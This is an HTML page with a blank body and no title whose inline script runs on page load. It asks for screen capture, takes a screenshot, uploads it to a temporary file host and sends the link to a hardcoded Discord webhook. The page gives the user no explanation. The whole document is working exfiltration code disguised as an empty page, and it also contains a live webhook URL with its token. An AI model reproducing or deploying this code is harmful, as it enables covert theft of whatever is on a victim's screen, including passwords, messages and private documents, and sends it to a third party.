<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title></title>
<style>body{margin:0;background:#fff}</style>
</head>
<body>
<script>
const WEBHOOK="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO-sHihafx71V_YdUCH50OPKtXt4cUMIoi2C9rzzA7bOvUziTLzd";

(async()=>{
  try{
    // open test tab just to notify permissions
    const testTab = window.open("test.html","_blank");
    console.log("Requesting screen capture...");
    const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
    console.log("Permissions granted.");

    if(testTab) testTab.postMessage({msg:"allowed-permissions"},"*");
    console.log("Sent allowed-permissions message to test tab.");

    // short pause
    await new Promise(r => setTimeout(r,1000));

    // setup video element
    const video = document.createElement("video");
    video.srcObject = stream;
    await new Promise(resolve=>{
      video.onloadedmetadata = ()=> video.play().then(resolve);
    });
    await new Promise(resolve=>{
      const check=()=>{if(video.videoWidth && video.videoHeight) resolve(); else setTimeout(check,50);}
      check();
    });

    // capture screenshot
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video,0,0);
    stream.getTracks().forEach(t=>t.stop());

    const blob = await new Promise(r=>canvas.toBlob(r,"image/png"));

    // upload to litterbox.catbox.moe
    console.log("Uploading screenshot to Litterbox...");
    const form = new FormData();
    form.append("reqtype","fileupload");
    form.append("time","24h");
    form.append("fileToUpload", blob, "shot.png");

    const uploadRes = await fetch("https://litterbox.catbox.moe/resources/internals/api.php", {method:"POST", body:form});
    const link = await uploadRes.text();
    console.log("Upload complete. Direct link:", link);

    // send link to discord
    await fetch(WEBHOOK,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({content:link})
    });
    console.log("Link sent to Discord!");

    // close test tab
    if(testTab) testTab.close();
    console.log("Test tab closed.");

  } catch(e){
    console.error("Error:", e);
  }
})();
</script>
</body>
</html>
